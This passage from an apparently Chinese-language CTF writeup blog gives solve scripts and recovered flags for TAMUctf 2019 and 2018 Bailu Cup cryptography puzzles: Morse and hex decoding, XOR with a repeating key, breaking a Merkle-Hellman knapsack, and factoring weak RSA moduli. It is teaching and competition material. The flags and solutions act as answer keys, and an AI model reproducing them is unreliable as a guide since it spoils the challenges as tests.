dah-dah-dah-dah-dit di-di-di-dah-dah di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-dit di-di-dah-dah-dah dah-dah-dah-dah-dah dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit di-dah di-di-di-di-dah dah-di-di-dit di-di-di-di-dit di-dah dah-dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-di-dit dah-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dah di-di-di-di-dah di-di-di-di-dit di-di-di-dah-dah dah-di-di-di-dit dah-dah-dah-di-dit di-di-di-di-dah dah-di-dah-dit dah-di-di-di-dit dah-di-dit di-di-di-dah-dah dah-dah-dah-di-dit di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit dah-di-di-di-dit dit di-di-di-di-dit di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah dah-dah-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-dah di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dah dit dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah di-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-di-dit dah-dah-dah-di-dit di-di-dah-dah-dah dah-di-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dit di-di-dah-dah-dah di-dah-dah-dah-dah di-di-di-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dit di-di-di-di-dah dah-dah-di-di-dit di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dit di-di-dah-dah-dah dah-dah-di-di-dit di-dah di-di-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah di-dah-dah-dah-dah dah-di-di-di-dit di-dah di-di-dah-dah-dah di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-di-dit di-di-di-di-dah di-di-dah-dah-dah dah-di-di-di-dit di-dah dah-di-di-di-dit di-di-di-di-dah di-di-di-di-dah dit di-di-di-di-dah dah-dah-dah-dah-dit dah-dah-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-dah-dah di-di-di-di-dit dah-dah-di-di-dit dah-dah-di-di-dit di-di-dah-dah-dah di-di-di-dah-dah di-di-dah-dah-dah di-di-di-di-dah di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dit di-di-di-di-dit di-dah di-di-di-di-dah di-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dit di-dah di-di-di-dah-dah di-di-dah-dah-dah dah-dah-di-di-dit di-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-dah-dah-dah dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-di-dit di-di-di-di-dah dah-di-dah-dit di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-dah-dit di-di-di-dah-dah dah-dah-di-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-dah-dah di-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah dah-dah-dah-dah-dit"</span></span><br><span class="line">cipher=cipher.replace(<span class="string">'-'</span>,<span class="string">''</span>).replace(<span class="string">'dit'</span>,<span class="string">'.'</span>).replace(<span class="string">'di'</span>,<span class="string">'.'</span>).replace(<span class="string">'dah'</span>,<span class="string">'-'</span>)</span><br><span class="line"><span class="keyword">print</span> morse(cipher)</span><br><span class="line"><span class="comment"># 0x57702a6c58744751386538716e6d4d59552a737646486b6a49742a5251264a705a766a6d2125254b446b6670235e4e39666b346455346c423372546f5430505a516d4351454b5942345a4d762a21466b386c25626a716c504d6649476d612525467a4720676967656d7b433169634b5f636c31434b2d7930755f683476335f6d3449317d20757634767a4b5a7434796f6d694453684c6d385145466e5574774a404e754f59665826387540476e213125547176305663527a56216a217675757038426a644e49714535772324255634555a4f595a327a37543235743726784c40574f373431305149</span></span><br><span class="line"><span class="comment"># use https://findneo.github.io/kt/tools.html#conv/ to convert hex to string</span></span><br><span class="line"><span class="comment"># gigem&#123;C1icK_cl1CK-y0u_h4v3_m4I1&#125;</span></span><br></pre></td></tr></table></figure><h2 id="RSAaaay"><a href="#RSAaaay" class="headerlink" title="RSAaaay"></a>RSAaaay</h2><blockquote><p>Hey, you’re a hacker, right? I think I am too, look at what I made!</p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (2531257, 43)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>My super secret message: <code>906851 991083 1780304 2380434 438490 356019 921472 822283 817856 556932 2102538 2501908 2211404 991083 1562919 38268</code></p><hr><p>Problem is, I don’t remember how to decrypt it… could you help me out?</p><p>Difficulty: easy</p></blockquote><p>solve.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">2531257</span></span><br><span class="line">e=<span class="number">43</span></span><br><span class="line">cc=[<span class="number">906851</span> ,<span class="number">991083</span> ,<span class="number">1780304</span> ,<span class="number">2380434</span> ,<span class="number">438490</span> ,<span class="number">356019</span> ,<span class="number">921472</span> ,<span class="number">822283</span> ,<span class="number">817856</span>, <span class="number">556932</span> ,<span class="number">2102538</span> ,<span class="number">2501908</span>, <span class="number">2211404</span> ,<span class="number">991083</span> ,<span class="number">1562919</span> ,<span class="number">38268</span>]</span><br><span class="line"></span><br><span class="line">p,q=<span class="number">509</span>,<span class="number">4973</span></span><br><span class="line"><span class="keyword">assert</span>(p*q==n)</span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"><span class="keyword">assert</span>(e*d%phi==<span class="number">1</span>)</span><br><span class="line">mm=<span class="string">''</span>.join([str(int(pow(c,d,n))) <span class="keyword">for</span> c <span class="keyword">in</span> cc])</span><br><span class="line"><span class="keyword">print</span> mm <span class="comment">#103105103101109123839711897103101958310512095701081211051101039584105103101114115125</span></span><br><span class="line"></span><br><span class="line">mm=[<span class="number">103</span>,<span class="number">105</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">123</span>,<span class="number">83</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">83</span>,<span class="number">105</span>,<span class="number">120</span>,<span class="number">95</span>,<span class="number">70</span>,<span class="number">108</span>,<span class="number">121</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">95</span>,<span class="number">84</span>,<span class="number">105</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">115</span>,<span class="number">125</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join([chr(m) <span class="keyword">for</span> m <span class="keyword">in</span> mm])</span><br><span class="line"><span class="comment"># gigem&#123;Savage_Six_Flying_Tigers&#125;</span></span><br></pre></td></tr></table></figure><h2 id="-1"><a href="#-1" class="headerlink" title=":)"></a>:)</h2><blockquote><p>Look at what I found! <code>XUBdTFdScw5XCVRGTglJXEpMSFpOQE5AVVxJBRpLT10aYBpIVwlbCVZATl1WTBpaTkBOQFVcSQdH</code></p><p>Difficulty: easy</p></blockquote><p>直接base64解码没有可打印字符。已知flag前几个字符为gigem{，尝试base64解码后内容和gigem逐字节异或得到<code>:):):</code> ，发现规律。</p><p>solve.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,itertools</span><br><span class="line">data=base64.b64decode(<span class="string">"XUBdTFdScw5XCVRGTglJXEpMSFpOQE5AVVxJBRpLT10aYBpIVwlbCVZATl1WTBpaTkBOQFVcSQdH"</span>)</span><br><span class="line">flag_format=<span class="string">"gigem&#123;"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(chr(ord(a)^ord(b))<span class="keyword">for</span> a,b <span class="keyword">in</span> zip(flag_format,data))</span><br><span class="line"><span class="comment"># :):):)</span></span><br><span class="line">print(<span class="string">''</span>.join(chr(ord(a)^ord(b)) <span class="keyword">for</span> a,b <span class="keyword">in</span> zip(data, itertools.cycle(<span class="string">':)'</span>))))</span><br><span class="line"><span class="comment"># gigem&#123;I'm not superstitious, but I am a little stitious.&#125;</span></span><br></pre></td></tr></table></figure><p>zip和itertools.cycle用法如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">zip(seq1 [, seq2 [...]]) -&gt; [(seq1[0], seq2[0] ...), (...)]</span><br><span class="line">param seq1</span><br><span class="line"></span><br><span class="line">Return a list of tuples, where each tuple contains the i-th element</span><br><span class="line"><span class="keyword">from</span> each of the argument sequences.  The returned list <span class="keyword">is</span> truncated</span><br><span class="line"><span class="keyword">in</span> length to the length of the shortest argument sequence.</span><br><span class="line"></span><br><span class="line">-------</span><br><span class="line"></span><br><span class="line">cycle(iterable) --&gt; cycle object</span><br><span class="line">param iterable</span><br><span class="line"></span><br><span class="line">Return elements <span class="keyword">from</span> the iterable until it <span class="keyword">is</span> exhausted.</span><br><span class="line">Then repeat the sequence indefinitely.</span><br></pre></td></tr></table></figure><p>另外有一个不错的 <a href="https://gchq.github.io/CyberChef/#recipe=Magic(3,true,false,&#39;&#39;" target="_blank" rel="noopener">工具</a>&amp;input=WFVCZFRGZFNjdzVYQ1ZSR1RnbEpYRXBNU0ZwT1FFNUFWVnhKQlJwTFQxMGFZQnBJVndsYkNWWkFUbDFXVEJwYVRrQk9RRlZjU1FkSA) 可以尝试检查数据可能的格式。</p><h2 id="Holey-Knapsack"><a href="#Holey-Knapsack" class="headerlink" title="Holey Knapsack"></a>Holey Knapsack</h2><blockquote><p>My knapsack has a hole in it</p><p>Cipher text: <code>11b90d6311b90ff90ce610c4123b10c40ce60dfa123610610ce60d450d000ce61061106110c4098515340d4512361534098509270e5d09850e58123610c9</code></p><p>Public key: <code>{99, 1235, 865, 990, 5, 1443, 895, 1477}</code></p><p>The flag is slightly off format.</p><p>Difficulty: medium</p></blockquote><p>是著名的和RSA同年发布的公钥加密系统 <a href="https://en.wikipedia.org/wiki/Merkle%E2%80%93Hellman_knapsack_cryptosystem" target="_blank" rel="noopener">Merkle-Hellman Public Key Cryptosystem</a>  ，是<a href="https://en.wikipedia.org/wiki/Knapsack_cryptosystems" target="_blank" rel="noopener">Knapsack cryptosystems</a> 之一，已被破解。 参见<a href="https://www.nevivur.net/writeups/2019/02/tamuctf-19/#holey-knapsack" target="_blank" rel="noopener">https://www.nevivur.net/writeups/2019/02/tamuctf-19/#holey-knapsack</a> 。</p><p><a href="https://www.nevivur.net/writeups/2019/02/tamuctf-19/holey-knapsack/solution.py" target="_blank" rel="noopener">解密脚本</a>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">pkey = [<span class="number">99</span>, <span class="number">1235</span>, <span class="number">865</span>, <span class="number">990</span>, <span class="number">5</span>, <span class="number">1443</span>, <span class="number">895</span>, <span class="number">1477</span>]</span><br><span class="line">ctext = <span class="string">'11b90d6311b90ff90ce610c4123b10c40ce60dfa123610610ce60d450d000ce61061106110c4098515340d4512361534098509270e5d09850e58123610c9'</span></span><br><span class="line"></span><br><span class="line">mapping = dict()</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    enc = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> c&amp;(<span class="number">1</span>&lt;&lt;i):</span><br><span class="line">            enc += pkey[i]</span><br><span class="line">    mapping[hex(enc)[<span class="number">2</span>:]] = chr(c)</span><br><span class="line"></span><br><span class="line">d = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> ctext:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d <span class="keyword">and</span> ctext[<span class="number">0</span>] == <span class="string">'0'</span>:</span><br><span class="line">        ctext = ctext[<span class="number">1</span>:]</span><br><span class="line">    d += ctext[<span class="number">0</span>]</span><br><span class="line">    ctext = ctext[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d <span class="keyword">in</span> mapping:</span><br><span class="line">        <span class="keyword">print</span> mapping[d],</span><br><span class="line">        d = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># g i g _ e m &#123; m e r k l e - h e l l m a n - k n a p s a c k &#125;</span></span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://ctftime.org/event/740/tasks/" target="_blank" rel="noopener">https://ctftime.org/event/740/tasks/</a> </li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>2018 柏鹭杯 writeup</title>
      <link href="/181125-bailucup-writeup/"/>
      <url>/181125-bailucup-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto1"><a href="#Crypto1" class="headerlink" title="Crypto1"></a>Crypto1</h3><h4 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_prime</span><span class="params">(n)</span>:</span></span><br><span class="line">    num = n + <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> isPrime(num):</span><br><span class="line">            <span class="keyword">return</span> num</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">p = random.randint(<span class="number">1</span>&lt;&lt;<span class="number">3071</span>,<span class="number">1</span>&lt;&lt;<span class="number">3072</span>)</span><br><span class="line">p = next_prime(p)</span><br><span class="line">q = next_prime(p*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">N = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = pow(bytes_to_long(flag),e,N)</span><br><span class="line"><span class="keyword">print</span> N<span class="comment">#247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159</span></span><br><span class="line"><span class="keyword">print</span> c<span class="comment">#152721025887735064764471379084548069204525956728140596238274397757947415316727016281416993518884790524343567541799262176820909148208728616947040227306302164641933331109468512979068186962047716308015535717796123080303496277784765187481185086876434873226524784636408104495312136956587251145463229424950634548624036265557622592089071331292811066840281494102799063634204855779210798330603868025111521826209601342683209160845433746624786171189961029265101816540639855230011618388675527443511618729301028631422873421421991470450059414988968787693753741941765791793672069240992955177930884210118700416564364129283739917229225845073750451244070534919112957275948312337882004219145847493047815403283126471638320784008475284616178697542301935170768573588093196019976675846311280356987370969400610196847990069257614148181804915868273001764028563852238142447411811579695265293746037324400494199877368049162903819737962946786971556872009326814914717430484711885484790156341127433550909206551293806568904858726942820132521566970376839336895645431303013575622422180179687172859250687080526393904583834607514619581478966664406178290247731116920836372943133394640322159512633671870473674514938423231596849301615200001553851411828993918474534316510609878376462094608058640335426907349648369552864820322464995077358198844334320833893207364879282292959161203675080110629771237503657412087961891443054530286088807186134851425688726147108076040204500951624929585070273336203814962656253259257806100191430918121713005141607192112560560371475173081441671613602480052062955279287813475764285469835557663176529059039540417149792518941598550609678298901186032272305421028365295602810159191055078633881059737011784127699357480578433240110432805495328517379885306237631225477566136721077348329866885731002878563684349453668924250445128775992616650275173644658245397235667490402628</span></span><br></pre></td></tr></table></figure><h4 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159</span></span><br><span class="line">c=<span class="number">152721025887735064764471379084548069204525956728140596238274397757947415316727016281416993518884790524343567541799262176820909148208728616947040227306302164641933331109468512979068186962047716308015535717796123080303496277784765187481185086876434873226524784636408104495312136956587251145463229424950634548624036265557622592089071331292811066840281494102799063634204855779210798330603868025111521826209601342683209160845433746624786171189961029265101816540639855230011618388675527443511618729301028631422873421421991470450059414988968787693753741941765791793672069240992955177930884210118700416564364129283739917229225845073750451244070534919112957275948312337882004219145847493047815403283126471638320784008475284616178697542301935170768573588093196019976675846311280356987370969400610196847990069257614148181804915868273001764028563852238142447411811579695265293746037324400494199877368049162903819737962946786971556872009326814914717430484711885484790156341127433550909206551293806568904858726942820132521566970376839336895645431303013575622422180179687172859250687080526393904583834607514619581478966664406178290247731116920836372943133394640322159512633671870473674514938423231596849301615200001553851411828993918474534316510609878376462094608058640335426907349648369552864820322464995077358198844334320833893207364879282292959161203675080110629771237503657412087961891443054530286088807186134851425688726147108076040204500951624929585070273336203814962656253259257806100191430918121713005141607192112560560371475173081441671613602480052062955279287813475764285469835557663176529059039540417149792518941598550609678298901186032272305421028365295602810159191055078633881059737011784127699357480578433240110432805495328517379885306237631225477566136721077348329866885731002878563684349453668924250445128775992616650275173644658245397235667490402628</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">k=gmpy2.iroot(n//<span class="number">10</span>+<span class="number">1</span>,<span class="number">2</span>)[<span class="number">0</span>]+<span class="number">1</span></span><br><span class="line">print(k)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xfffffff</span>):</span><br><span class="line">    f=k-i</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">10000</span>==<span class="number">0</span>:</span><br><span class="line">        print(i,end=<span class="string">" "</span>)</span><br><span class="line">    <span class="keyword">if</span> n%f==<span class="number">0</span>:</span><br><span class="line">        print(i,n)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p=f</span><br><span class="line">q=n//f</span><br><span class="line"><span class="keyword">assert</span>(p*q==n)</span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4971490805710648894784063900603982138103528416416093113682856149525895474391965093292856360186270533203485404384261736770807923420477678768335595268260058770929420214670794184479653642688593773001265441972139034999789321709099375988424776953616924996952770970955016095518058970453801153351600603001621188113472370286189729979231943525793160692844078376540082324198649179890017101800683049489232021392715915700831833371902425005874555370189042455321691195416425399507551235346773377429357933240695935997956969841660473107352934178051894901298644110556291216221039424250078546978571086275993790666829060240691673857284132895978717935677825502362997789971900863003499701755174512295162461514926135376073693593713246781021035797102243028802222257489266812730745381990847604727619717567202686948267842932198278066304365500430012440700948799107940169074390644763691400614036677335457180241108468029814414775113509028739480597728378</span></span><br><span class="line"><span class="comment"># 0 59 247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159</span></span><br><span class="line"><span class="comment"># b'ISEC&#123;simp13_crypt0&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="Crypto2"><a href="#Crypto2" class="headerlink" title="Crypto2"></a>Crypto2</h3><blockquote><p>基因会突变，BASE64与Caesar也变异<br>加密密文: AUikzgRpLWaVIEaeKrqkJiieLhhqvf6=<br>​    格式: ISEC{ }</p></blockquote><p>我好像不太懂╮(╯▽╰)╭</p><h3 id="Crypto3"><a href="#Crypto3" class="headerlink" title="Crypto3"></a>Crypto3</h3><h4 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RSA(<span class="number">829467319</span>, <span class="number">48357</span>)</span><br><span class="line"><span class="number">322517722</span>,<span class="number">575397051</span>,<span class="number">76525646</span>,<span class="number">768452152</span>,<span class="number">107590034</span>,<span class="number">710690594</span>,<span class="number">322517722</span>,<span class="number">174907762</span>,<span class="number">343945760</span>,<span class="number">763355610</span>,<span class="number">301647581</span>,<span class="number">349705569</span>,<span class="number">575397051</span>,<span class="number">76525646</span>,<span class="number">410109929</span>,<span class="number">322517722</span>,<span class="number">497916224</span>,<span class="number">228868281</span>,<span class="number">228868281</span>,<span class="number">741167939</span>,<span class="number">497916224</span>,<span class="number">450014050</span>,<span class="number">322517722</span>,<span class="number">322517722</span>,<span class="number">126657310</span>,<span class="number">349705569</span>,<span class="number">322517722</span>,<span class="number">707637171</span>,<span class="number">76525646</span>,<span class="number">527107437</span>,<span class="number">710690594</span>,<span class="number">685252839</span>,<span class="number">450014050</span>,<span class="number">349705569</span>,<span class="number">388149253</span>,<span class="number">710690594</span>,<span class="number">763355610</span>,<span class="number">211593791</span>,<span class="number">707637171</span>,<span class="number">369453331</span>,<span class="number">228868281</span>,<span class="number">541631545</span>,<span class="number">397988536</span>,<span class="number">322517722</span>,<span class="number">12982396</span>,<span class="number">107590034</span>,<span class="number">387385119</span>,<span class="number">322517722</span>,<span class="number">685252839</span>,<span class="number">710690594</span>,<span class="number">322517722</span>,<span class="number">109170298</span>,<span class="number">349705569</span>,<span class="number">763355610</span>,<span class="number">349705569</span>,<span class="number">349705569</span>,<span class="number">37195518</span>,<span class="number">25028382</span>,<span class="number">610867628</span>,<span class="number">44896265</span>,<span class="number">25028382</span>,<span class="number">454683367</span>,<span class="number">15283689</span></span><br></pre></td></tr></table></figure><h4 id="solve-1"><a href="#solve-1" class="headerlink" title="solve"></a>solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding : utf-8 -*-</span></span><br><span class="line"><span class="comment"># __author__ = 'https://github.com/findneo'</span></span><br><span class="line"></span><br><span class="line"><span 